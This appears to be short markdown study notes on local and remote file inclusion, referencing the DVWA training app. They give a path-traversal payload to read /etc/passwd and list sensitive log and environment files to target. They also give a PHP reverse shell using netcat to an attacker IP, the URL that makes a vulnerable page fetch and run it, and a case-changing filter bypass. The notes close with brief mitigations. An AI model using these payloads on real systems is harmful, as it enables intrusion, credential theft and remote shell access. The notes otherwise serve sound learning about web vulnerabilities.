# File Inclusion

## Local
- Exploit
  - Modify ```?page=include.php``` to ```?page=../../../../../etc/passwd```

- Intersting files
  - /proc/self/environ
  - /var/log/auth.log
  - /var/log/apache2/access.log  

- Example
  - [DVWA](../BuggyApp/DVWA/file-inclusion.md)  
  
- Mitigation
  - Use static file inclusion. hard code the fiels that we want to include in the code.

## Remote
- Exploit
  - Save the code as *"reverse.txt"*, if extnsion be *"php"*, it will run on kali machine. ? is for run the code in victim machine
```php
<?php
passthru('nc -e /bin/sh 10.20.14.203 8080');
?>
```
  - Modify ```?page=include.php``` to ```?page=http://10.20.14.203/reverse.txt?```

- Bypass
  - ```?page=hTTp://10.20.14.203/reverse.txt?```

- Mitigation
  -  Disable *"allow_url_fopen = On"* & *"allow_url_include = On"*

